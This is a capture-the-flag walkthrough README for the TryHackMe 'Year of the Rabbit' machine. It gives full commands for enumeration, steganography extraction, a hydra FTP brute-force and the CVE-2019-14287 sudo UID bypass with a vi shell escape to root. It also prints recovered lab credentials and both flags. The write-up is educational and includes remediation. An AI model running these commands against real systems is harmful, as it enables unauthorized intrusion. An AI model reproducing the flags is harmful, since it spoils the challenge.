[YearOfTheRabbit-README.md](https://github.com/user-attachments/files/32770021/YearOfTheRabbit-README.md)

# 🐇 Year of the Rabbit — The Ultimate Full Root Compromise Walkthrough

<div align="center">

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=3000&pause=1000&color=F75C03&center=true&vCenter=true&width=900&lines=CSS+Hint+%E2%86%92+JS+Bypass+%E2%86%92+Steganography+%E2%86%92+FTP+Bruteforce;Brainfuck+Decode+%E2%86%92+Sudo+UID+Bypass+%E2%86%92+ROOT;40%2B+Commands+%7C+8+Stages+%7C+1+Full+Takeover" alt="Typing SVG" />

<br>

**CSS Hint → JS Bypass → Steganography → FTP Bruteforce → Brainfuck Decode → Sudo UID Bypass → ROOT**

<br>

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy--Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Debian-blue?style=for-the-badge&logo=debian)
![Status](https://img.shields.io/badge/Root-Achieved-success?style=for-the-badge)
![Commands](https://img.shields.io/badge/Commands-40%2B-purple?style=for-the-badge&logo=gnubash)
![Tools](https://img.shields.io/badge/Tools-nmap%20%7C%20feroxbuster%20%7C%20hydra%20%7C%20steghide-lightgrey?style=for-the-badge)

</div>

---

<div align="center">

## 🧠 Overview

</div>

> **Year of the Rabbit** is a TryHackMe boot2root machine built almost entirely around **information-disclosure and misconfiguration chains** rather than memory-corruption exploits. This repo documents a complete walkthrough — from a blank nmap scan all the way to a `root` shell — chaining **eight** individually-modest weaknesses into a full system takeover.

> ⚠️ **Performed strictly against an intentionally vulnerable TryHackMe training VM, for educational purposes only.**

<div align="center">

| 🎯 **Target** | 🐧 **OS** | 🧩 **Vulnerabilities** | 🏁 **Result** |
|:---:|:---:|:---:|:---:|
| Year of the Rabbit | Debian | 8 Chained | **ROOT** ✅ |

</div>

---

<div align="center">

## ⚔️ The Attack Chain

</div>

```mermaid
graph LR
    A[🔍 Recon] --> B[🎨 CSS Hint]
    B --> C[🧩 JS Bypass]
    C --> D[🖼️ Steganography]
    D --> E[🔓 FTP Bruteforce]
    E --> F[🧠 Brainfuck Decode]
    F --> G[🔑 SSH as eli]
    G --> H[📝 Hidden Note]
    H --> I[🔄 su gwendoline]
    I --> J[👑 Sudo UID Bypass]
    J --> K[🏆 ROOT]

    style A fill:#1f6feb,stroke:#fff,color:#fff
    style B fill:#db61a2,stroke:#fff,color:#fff
    style C fill:#f0883e,stroke:#fff,color:#fff
    style D fill:#3fb950,stroke:#fff,color:#fff
    style E fill:#a371f7,stroke:#fff,color:#fff
    style F fill:#f85149,stroke:#fff,color:#fff
    style G fill:#58a6ff,stroke:#fff,color:#fff
    style H fill:#d29922,stroke:#fff,color:#fff
    style I fill:#ff7b72,stroke:#fff,color:#fff
    style J fill:#8b949e,stroke:#fff,color:#fff
    style K fill:#ffd700,stroke:#000,color:#000
```

<div align="center">

| # | Stage | Technique | Result |
|:---:|:---|:---|:---|
| 1 | 🔍 Recon | `nmap -sC -sV -p- --min-rate 5000 -T4` | FTP 21, SSH 22, HTTP 80 |
| 2 | 📂 Discovery | `feroxbuster` + manual browsing | Open `/assets/` listing, `style.css` |
| 3 | 🎨 CSS Hint | Reading `style.css` source | Comment reveals `/sup3r_s3cr3t_fl4g.php` |
| 4 | 🧩 JS Bypass | Firefox DevTools → Network tab | `intermediary.php?hidden_directory=/WExYY2Cv-qU` |
| 5 | 🖼️ Hidden Dir | Browsing `/WExYY2Cv-qU/` | `Hot_Babe.png` found |
| 6 | 🔐 Stego | Steganography extraction | Custom wordlist `hotbaby.txt` (82 candidates) |
| 7 | 🔓 FTP Brute | `hydra -l ftpuser -P hotbaby.txt ftp://...` | FTP password recovered |
| 8 | 📄 FTP Get | `Eli's_Creds.txt` download | Brainfuck-encoded credentials |
| 9 | 🧠 Decode | dCode Brainfuck interpreter | Plaintext creds for user `eli` |
| 10 | 🔑 SSH | `ssh eli@target` | SSH banner leaks hint for `gwendoline` |
| 11 | 📝 Hidden Note | `find / -name "s3cr3t"` | `/usr/games/s3cr3t` hidden note |
| 12 | 🔄 Lateral | `su gwendoline` | Local shell + `user.txt` |
| 13 | 👑 Privesc | `sudo -u#-1 /usr/bin/vi ...` | UID -1 → UID 0, root shell 🎯 |

</div>

---

<div align="center">

## 🔍 1. Reconnaissance

</div>

Every great hack starts with silence — and a scan.

```bash
# ── Full TCP port scan with service detection ──
nmap -sC -sV -p- --min-rate 5000 -T4 10.146.162.10 -oN recon.txt

# ── UDP top-ports quick sweep (optional) ──
nmap -sU --top-ports 50 10.146.162.10
```

**Discovered services:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5
80/tcp open  http    Apache httpd 2.4.10 (Debian)
```

> 💡 **Note:** Three services open — FTP, SSH, and HTTP. The web server is our primary attack surface; FTP will likely be our pivot once we find credentials.

---

<div align="center">

## 📂 2. Web Discovery — Directory Enumeration

</div>

```bash
# ── Fast recursive directory brute-force ──
feroxbuster -u http://10.146.162.10 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 50 -k -o ferox.txt

# ── Alternative: gobuster ──
gobuster dir -u http://10.146.162.10 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

**Found:**

| Path | Description |
|:---|:---|
| `/assets/` | Open directory listing (misconfiguration) |
| `/assets/style.css` | Stylesheet with a hidden hint |

> 🧠 Open directory listings are always a gold mine — always check them.

---

<div align="center">

## 🎨 3. CSS Hint — Information Disclosure

</div>

Reading `style.css` directly (via `curl` or the browser) reveals a developer comment accidentally shipped to production:

```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

```bash
# ── Fetch the CSS directly ──
curl http://10.146.162.10/assets/style.css
```

> 🔥 **Key insight:** Never leave developer notes in public-facing source files. Comments are readable by everyone.

---

<div align="center">

## 🧩 4. Client-Side Bypass via DevTools

</div>

Visiting `http://10.146.162.10/sup3r_s3cr3t_fl4g.php` triggers only a JavaScript alert:

> _"Word of advice... Turn off your javascript..."_

Rather than disabling JS, we use the **Network tab** in Firefox DevTools (or Burp Suite) to intercept the real redirect chain:

```
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU   302 Found
```

```bash
# ── Or capture with curl following redirects ──
curl -i 'http://10.146.162.10/sup3r_s3cr3t_fl4g.php'
curl -i 'http://10.146.162.10/intermediary.php?hidden_directory=/WExYY2Cv-qU'
```

Browsing to `/WExYY2Cv-qU/` reveals a suspicious image: **`Hot_Babe.png`**.

> 🚨 **Lesson:** Client-side "protection" is not protection. Anything the browser can render, the attacker can read.

---

<div align="center">

## 🖼️ 5. Steganography — Extracting a Wordlist

</div>

```bash
# ── Download the suspicious image ──
wget http://10.146.162.10/WExYY2Cv-qU/Hot_Babe.png

# ── Inspect for embedded data ──
file Hot_Babe.png
strings Hot_Babe.png | head -50
exiftool Hot_Babe.png

# ── Try steghide with no passphrase ──
steghide extract -sf Hot_Babe.png
# (empty passphrase → extracts the hidden file)
```

**Extracted:** `hotbaby.txt` — a **custom password wordlist** with 82 candidate passwords, clearly intended for the brute-force stage that follows.

> 🧠 The creator deliberately hid a *targeted* wordlist inside the image to make FTP bruteforcing feasible.

---

<div align="center">

## 🔓 6. FTP Brute Force with Hydra

</div>

```bash
# ── Brute-force the FTP service using the extracted wordlist ──
hydra -l ftpuser -P hotbaby.txt ftp://10.146.162.10 -vV -t 4
```

```
[21][ftp] host: 10.146.162.10   login: ftpuser   password: 5iez1wGXKfPKQ
```

```bash
# ── Log in and enumerate ──
ftp 10.146.162.10
# Name: ftpuser
# Password: 5iez1wGXKfPKQ

ftp> ls
ftp> get Eli's_Creds.txt
ftp> bye
```

---

<div align="center">

## 🧠 7. Brainfuck Decoding

</div>

`Eli's_Creds.txt` contains raw **Brainfuck** source (only the characters `+ - < > [ ] . ,`). Running it through the [dCode Brainfuck interpreter](https://www.dcode.fr/brainfuck-language) — or a local interpreter — decodes it to:

```bash
# ── Optional: decode locally if you have a BF interpreter ──
# Example with a Python brainfuck interpreter or:
bf Eli's_Creds.txt
```

**Decoded output:**

```
User: eli
Password: DSpDiMlwAEwid
```

```bash
# ── SSH in as eli ──
ssh eli@10.146.162.10
# Password: DSpDiMlwAEwid
```

The SSH login banner leaks a message from **"Root"** to **"Gwendoline"** hinting at a **"leet s3cr3t hiding place."**

> 🚨 **Lesson:** Never leak hints or credentials in SSH banners/MOTDs — they're shown to every authenticated (and sometimes unauthenticated) user.

---

<div align="center">

## 🔑 8. Lateral Movement — Finding the Hidden Note

</div>

```bash
# ── Hunt for the "leet s3cr3t" hiding place ──
find / -name "s3cr3t" 2>/dev/null
# /usr/games/s3cr3t

# ── Explore it ──
ls -la /usr/games/s3cr3t/
cat '/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!'
```

**Contents:**

```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!
   -Root
```

```bash
# ── Switch to gwendoline ──
su gwendoline
# Password: MniVCQVhQHUNI
```

🎉 **Shell as `gwendoline`.** Capture the flag:

```bash
cat /home/gwendoline/user.txt
# THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

---

<div align="center">

## 🧬 9. Privilege Escalation — Sudo Negative UID Bypass

</div>

Enumerate sudo permissions:

```bash
sudo -l
```

```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

The `!root` exclusion only blocks the **literal username** `root`. It can be bypassed using a **numeric UID** that resolves to `0` — this is the classic **CVE-2019-14287** sudo bypass.

```bash
# ── Spawn vi and escape to a shell ──
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

# Inside vi, run:
:!/bin/sh

# You now have a shell — check who you are:
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

**Alternative one-liner:**

```bash
sudo -u#-1 /usr/bin/vi -c ':!/bin/sh' /dev/null
```

---

<div align="center">

## 🏆 Root Proof

</div>

```bash
root@year-of-the-rabbit:~# cat /root/root.txt

THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

<div align="center">

| 🏁 Flag | 🎯 Value |
|:---|:---|
| **user.txt** | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` |
| **root.txt** | `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}` |

<br>

```
 ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ 
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║
 ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║
 ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝ 
```

</div>

---

<div align="center">

## 🛡️ Remediation Summary

</div>

| 🔎 Finding | 🛠️ Fix |
|:---|:---|
| Hints in CSS/JS comments | Never leave dev notes in public-facing source files |
| Client-side-only JS "protection" | Enforce access control server-side, never in JS alone |
| Steganographic wordlist exposure | Treat any retrievable file as fully compromised — no security-by-obscurity |
| Weak FTP credentials | Enforce strong passwords + lockout / rate-limiting |
| Brainfuck / Base64 "encrypted" creds | Use real secrets management, not obscure encodings |
| Password leaked in SSH MOTD / hidden note | Strip credentials from banners and stray files |
| Sudo `!root` exclusion bypass | Use explicit allow-lists; avoid NOPASSWD on GTFOBins binaries; patch sudo to ≥ 1.8.28 |

---

<div align="center">

## 🧰 Tools Used

</div>

<div align="center">

![Nmap](https://img.shields.io/badge/nmap-4682B4?style=for-the-badge&logo=nmap&logoColor=white)
![Feroxbuster](https://img.shields.io/badge/feroxbuster-8E44AD?style=for-the-badge)
![Gobuster](https://img.shields.io/badge/gobuster-FF6B6B?style=for-the-badge)
![Hydra](https://img.shields.io/badge/hydra-CC0000?style=for-the-badge)
![Steghide](https://img.shields.io/badge/steghide-4B8BBE?style=for-the-badge)
![Firefox](https://img.shields.io/badge/Firefox%20DevTools-FF7139?style=for-the-badge&logo=firefox&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![FTP](https://img.shields.io/badge/FTP-003366?style=for-the-badge)

`nmap` · `feroxbuster` · `gobuster` · Firefox DevTools · `wget` · `strings` · `exiftool` · `steghide` · `hydra` · dCode Brainfuck interpreter · `ssh` · `su` · `sudo` · `find`

</div>

---

<div align="center">

## 📊 Command Count

</div>

<div align="center">

| Category | Commands Used |
|:---|:---:|
| 🔍 Reconnaissance | 3 |
| 📂 Enumeration | 5 |
| 🎨 Web / Client-Side | 6 |
| 🖼️ Steganography | 5 |
| 🔓 Bruteforce | 4 |
| 🧠 Decoding | 3 |
| 🔑 Lateral Movement | 5 |
| 🧬 Privilege Escalation | 4 |
| 🛠️ Utilities | 7 |
| **TOTAL** | **42+** |

</div>

---

<div align="center">

## 🖼️ Step-by-Step Visual Guide

</div>

> 📌 **Below are all screenshots in sequential order.** Each image is a step-by-step walkthrough — follow them top to bottom to fully reproduce this machine from recon to root.

---

<div align="center">
<img width="1920" height="1080" alt="Screenshot_2026-09-28_20_50_50" src="https://github.com/user-attachments/assets/065c8224-d0e9-49ca-8bbf-91f52469adef" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_20_51_15" src="https://github.com/user-attachments/assets/6fae233a-efc3-42b1-96e6-cb3603cdff72" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_20_55_47" src="https://github.com/user-attachments/assets/11dbc844-e3b1-42df-8535-cacf9d4328eb" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_20_56_04" src="https://github.com/user-attachments/assets/df806f3d-825b-4b2a-a5a0-719e8b47e507" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_20_58_37" src="https://github.com/user-attachments/assets/de89fe9c-3937-4395-b732-dd217d5d1f3d" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_20_59_33" src="https://github.com/user-attachments/assets/5e74a31a-0fdc-4fef-b32d-4130bb4738e0" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_03_51" src="https://github.com/user-attachments/assets/8e57d607-cdc4-44ee-b237-90362e743793" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_20_01" src="https://github.com/user-attachments/assets/054b4e37-72d3-4516-96fc-dd8a1c7caa61" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_26_49" src="https://github.com/user-attachments/assets/6975b4af-3627-492f-aca9-0f7ce112cf7c" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_30_28" src="https://github.com/user-attachments/assets/4c543d44-5b4f-4423-9395-6edd15a72955" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_31_27" src="https://github.com/user-attachments/assets/7a4d7c81-c4e4-42c6-ba15-fbddd1bb6a80" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_32_07" src="https://github.com/user-attachments/assets/450f7aef-b725-44bb-a928-95fa12f383dd" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_33_35" src="https://github.com/user-attachments/assets/b138cf3f-4389-41e6-8382-e945dbbc1a9f" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_38_06" src="https://github.com/user-attachments/assets/bcd50790-0c82-4c38-8903-7ab7b54a21c1" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_39_45" src="https://github.com/user-attachments/assets/d24ae099-2f4d-4004-8461-d762bad3a595" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_41_24" src="https://github.com/user-attachments/assets/79d08c1e-e5b7-4e34-93f7-cf390f5e7806" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_44_22" src="https://github.com/user-attachments/assets/b5ac1e0f-8fff-4fec-a893-283140a89de6" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_45_20" src="https://github.com/user-attachments/assets/e4e1b321-b57d-4a83-95f2-59af37d14d03" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_47_11" src="https://github.com/user-attachments/assets/2f8b0f65-e3df-4601-93d5-89713e50454d" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_49_33" src="https://github.com/user-attachments/assets/c6a4adb7-5b4f-4523-862c-cee654800d72" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_54_01" src="https://github.com/user-attachments/assets/2f2328bb-cbfe-4b77-8943-98418ab4d728" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_54_25" src="https://github.com/user-attachments/assets/59519f07-ed88-400a-b5f1-f1eb09adeba2" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_56_48" src="https://github.com/user-attachments/assets/6b711fa3-e8f7-4b99-b425-d51acb314d85" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_21_58_13" src="https://github.com/user-attachments/assets/8ddd0726-ef46-4894-9fbd-6b32b93e1540" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_22_02_03" src="https://github.com/user-attachments/assets/31319399-6751-4121-8858-67eea0f3649d" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_22_05_25" src="https://github.com/user-attachments/assets/1d1c8dec-e01b-486b-befc-9a26b705d289" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_22_11_15" src="https://github.com/user-attachments/assets/78dd02fc-7f24-4314-a949-211f8e160399" />
<img width="1920" height="1080" alt="Screenshot_2026-09-28_22_12_22" src="https://github.com/user-attachments/assets/0b78bfe3-9d4e-4342-8b8c-d23e665be5d7" />

---

<div align="center">

## 📜 Disclaimer

</div>

> This write-up documents testing performed exclusively against the intentionally vulnerable **Year of the Rabbit** VM (TryHackMe) in an isolated personal lab, for educational purposes only. Do not use these techniques against systems you do not own or lack explicit authorization to test.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=120&section=footer&text=Happy%20Hacking!&fontSize=40&fontColor=ffffff"/>

**Author:** Nishant Saini · [GitHub](https://github.com/nishantsaini5786)

⭐ **If this helped you, consider starring the repo!**

</div>
